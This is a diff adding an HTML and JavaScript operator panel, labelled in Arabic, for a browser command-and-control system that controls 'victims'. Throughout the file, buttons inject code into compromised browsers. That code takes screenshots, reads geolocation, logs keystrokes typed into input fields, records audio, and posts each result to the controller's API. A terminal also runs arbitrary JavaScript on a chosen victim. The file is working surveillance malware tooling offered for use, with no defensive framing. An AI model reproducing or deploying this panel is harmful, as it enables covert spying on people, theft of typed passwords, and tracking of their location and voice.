@@ -1,0 +1,317 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>لوحة تحكم C2 المتقدمة</title>
+    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        .victim-card {
+            transition: all 0.3s;
+            cursor: pointer;
+        }
+        .victim-card:hover {
+            transform: translateY(-5px);
+            box-shadow: 0 10px 20px rgba(0,0,0,0.1);
+        }
+        .active-session {
+            border-left: 4px solid #28a745;
+        }
+        #terminal {
+            font-family: monospace;
+            height: 300px;
+            overflow-y: auto;
+            background-color: #1e1e1e;
+            color: #f8f9fa;
+            padding: 15px;
+            border-radius: 5px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container-fluid">
+        <div class="row">
+            <!-- الشريط الجانبي -->
+            <div class="col-md-3 bg-dark text-white p-3">
+                <h4 class="text-center mb-4">الأجهزة النشطة</h4>
+                <div id="active-devices">
+                    <!-- يتم تعبئته عبر JavaScript -->
+                </div>
+            </div>
+
+            <!-- المحتوى الرئيسي -->
+            <div class="col-md-9 p-4">
+                <div class="row mb-4">
+                    <div class="col">
+                        <h3 id="selected-victim">اختر جهازًا من القائمة</h3>
+                    </div>
+                </div>
+
+                <div class="row mb-4">
+                    <div class="col">
+                        <div class="card">
+                            <div class="card-header bg-primary text-white">
+                                تحكم سريع
+                            </div>
+                            <div class="card-body">
+                                <button class="btn btn-success me-2" onclick="sendCommand('screenshot')">
+                                    <i class="bi bi-camera"></i> لقطة شاشة
+                                </button>
+                                <button class="btn btn-info me-2" onclick="sendCommand('geolocation')">
+                                    <i class="bi bi-geo-alt"></i> الموقع الجغرافي
+                                </button>
+                                <button class="btn btn-warning me-2" onclick="sendCommand('keylogger_start')">
+                                    <i class="bi bi-keyboard"></i> تفعيل Keylogger
+                                </button>
+                                <button class="btn btn-danger" onclick="sendCommand('audio_record 30')">
+                                    <i class="bi bi-mic"></i> تسجيل صوت (30 ثانية)
+                                </button>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="row">
+                    <div class="col-md-6 mb-4">
+                        <div class="card h-100">
+                            <div class="card-header bg-secondary text-white">
+                                معلومات الجهاز
+                            </div>
+                            <div class="card-body" id="device-info">
+                                اختر جهازًا لعرض المعلومات
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="col-md-6 mb-4">
+                        <div class="card h-100">
+                            <div class="card-header bg-secondary text-white">
+                                طرفية الأوامر
+                            </div>
+                            <div class="card-body">
+                                <div id="terminal"></div>
+                                <div class="input-group mt-3">
+                                    <input type="text" class="form-control" id="custom-command" 
+                                           placeholder="أدخل أمر JS مخصص">
+                                    <button class="btn btn-primary" onclick="executeCustomCommand()">
+                                        تنفيذ
+                                    </button>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="row">
+                    <div class="col">
+                        <div class="card">
+                            <div class="card-header bg-info text-white">
+                                سجل النشاطات
+                            </div>
+                            <div class="card-body">
+                                <ul class="list-group" id="activity-log">
+                                    <!-- يتم تعبئته عبر JavaScript -->
+                                </ul>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Modal لعرض الوسائط -->
+    <div class="modal fade" id="mediaModal" tabindex="-1">
+        <div class="modal-dialog modal-lg">
+            <div class="modal-content">
+                <div class="modal-header">
+                    <h5 class="modal-title" id="mediaModalLabel">معاينة المحتوى</h5>
+                    <button type="button" class="btn-close" data-bs-dismiss="modal"></button>
+                </div>
+                <div class="modal-body" id="mediaModalContent">
+                    <!-- يتم تعبئته عبر JavaScript -->
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
+    <script>
+        let currentVictim = null;
+        const terminal = document.getElementById('terminal');
+        const mediaModal = new bootstrap.Modal(document.getElementById('mediaModal'));
+
+        // تحديث قائمة الأجهزة كل 10 ثواني
+        function refreshDevices() {
+            fetch('/api/victims')
+                .then(response => response.json())
+                .then(data => {
+                    const container = document.getElementById('active-devices');
+                    container.innerHTML = '';
+                    
+                    data.victims.forEach(victim => {
+                        const card = document.createElement('div');
+                        card.className = `card mb-2 p-2 victim-card ${victim.is_online ? 'active-session' : ''}`;
+                        card.innerHTML = `
+                            <h6>${victim.id}</h6>
+                            <small>IP: ${victim.ip || 'غير معروف'}</small><br>
+                            <small>آخر نشاط: ${victim.last_seen}</small>
+                            <span class="badge ${victim.is_online ? 'bg-success' : 'bg-secondary'} float-start">
+                                ${victim.is_online ? 'نشط' : 'غير متصل'}
+                            </span>
+                        `;
+                        card.onclick = () => selectVictim(victim.id);
+                        container.appendChild(card);
+                    });
+                });
+        }
+
+        // تحديد ضحية معينة
+        function selectVictim(victimId) {
+            currentVictim = victimId;
+            document.getElementById('selected-victim').textContent = `الجهاز المحدد: ${victimId}`;
+            
+            // جلب معلومات الجهاز
+            fetch(`/api/victim_info?victim_id=${victimId}`)
+                .then(response => response.json())
+                .then(data => {
+                    document.getElementById('device-info').innerHTML = `
+                        <p><strong>نظام التشغيل:</strong> ${data.navigator?.platform || 'غير معروف'}</p>
+                        <p><strong>المتصفح:</strong> ${data.navigator?.userAgent || 'غير معروف'}</p>
+                        <p><strong>الدقة:</strong> ${data.screen?.width}x${data.screen?.height}</p>
+                        <p><strong>الموقع التقريبي:</strong> ${data.network?.ip || 'غير معروف'}</p>
+                    `;
+                });
+
+            // جلب سجل النشاطات
+            fetch(`/api/activities?victim_id=${victimId}`)
+                .then(response => response.json())
+                .then(data => {
+                    const logContainer = document.getElementById('activity-log');
+                    logContainer.innerHTML = '';
+                    
+                    data.activities.forEach(activity => {
+                        const li = document.createElement('li');
+                        li.className = 'list-group-item';
+                        li.innerHTML = `
+                            <small>${activity.timestamp}</small><br>
+                            ${activity.type === 'command' ? 'أمر: ' + activity.command : 
+                              activity.type === 'screenshot' ? 'لقطة شاشة' : 
+                              activity.type === 'keylog' ? 'تسجيل ضغطات: ' + activity.data.key : ''}
+                            ${activity.type === 'screenshot' ? 
+                                `<button class="btn btn-sm btn-primary float-end" 
+                                    onclick="showMedia('${activity.data.image}')">عرض</button>` : ''}
+                        `;
+                        logContainer.appendChild(li);
+                    });
+                });
+        }
+
+        // إرسال أوامر للضحية
+        function sendCommand(type) {
+            if (!currentVictim) {
+                alert('الرجاء تحديد جهاز أولاً');
+                return;
+            }
+
+            let command = '';
+            switch(type) {
+                case 'screenshot':
+                    command = `captureScreenshot().then(img => {
+                        fetch('/api/screenshot', {
+                            method: 'POST',
+                            body: JSON.stringify({victim_id: '${currentVictim}', image: img})
+                        });
+                    });`;
+                    break;
+                case 'geolocation':
+                    command = `navigator.geolocation.getCurrentPosition(pos => {
+                        fetch('/api/geo', {
+                            method: 'POST',
+                            body: JSON.stringify({
+                                victim_id: '${currentVictim}',
+                                geo: { lat: pos.coords.latitude, lng: pos.coords.longitude }
+                            })
+                        });
+                    });`;
+                    break;
+                case 'keylogger_start':
+                    command = `document.addEventListener('keydown', logKey);
+                        function logKey(e) {
+                            const target = e.target;
+                            if (target.tagName.match(/INPUT|TEXTAREA|SELECT/i)) {
+                                fetch('/api/keylog', {
+                                    method: 'POST',
+                                    body: JSON.stringify({
+                                        victim_id: '${currentVictim}',
+                                        key: e.key,
+                                        page: window.location.href
+                                    })
+                                });
+                            }
+                        }`;
+                    break;
+                case 'audio_record':
+                    const duration = type.split(' ')[1] || 30;
+                    command = `recordAudio(${duration} * 1000).then(audio => {
+                        fetch('/api/audio', {
+                            method: 'POST',
+                            body: JSON.stringify({victim_id: '${currentVictim}', audio: audio})
+                        });
+                    });`;
+                    break;
+            }
+
+            executeCommand(command);
+        }
+
+        // تنفيذ أمر مخصص
+        function executeCustomCommand() {
+            const command = document.getElementById('custom-command').value;
+            if (command && currentVictim) {
+                executeCommand(command);
+            }
+        }
+
+        // تنفيذ الأمر وإظهار النتيجة
+        function executeCommand(jsCode) {
+            terminal.innerHTML += `<div class="text-info">>> ${jsCode}</div>`;
+            
+            fetch('/api/execute', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ victim_id: currentVictim, command: jsCode })
+            })
+            .then(response => response.json())
+            .then(data => {
+                terminal.innerHTML += `<div class="text-success"><< ${JSON.stringify(data)}</div>`;
+                terminal.scrollTop = terminal.scrollHeight;
+            });
+        }
+
+        // عرض الوسائط (صور/تسجيلات)
+        function showMedia(dataUrl) {
+            const content = document.getElementById('mediaModalContent');
+            
+            if (dataUrl.startsWith('data:image')) {
+                content.innerHTML = `<img src="${dataUrl}" class="img-fluid">`;
+            } else if (dataUrl.startsWith('data:audio')) {
+                content.innerHTML = `
+                    <audio controls>
+                        <source src="${dataUrl}" type="audio/webm">
+                        المتصفح لا يدعم تشغيل الصوت
+                    </audio>
+                `;
+            }
+            
+            mediaModal.show();
+        }
+
+        // التهيئة الأولية
+        document.addEventListener('DOMContentLoaded', () => {
+            refreshDevices();
+            setInterval(refreshDevices, 10000); // تحديث كل 10 ثواني
+        });
+    </script>
+</body>
+</html>
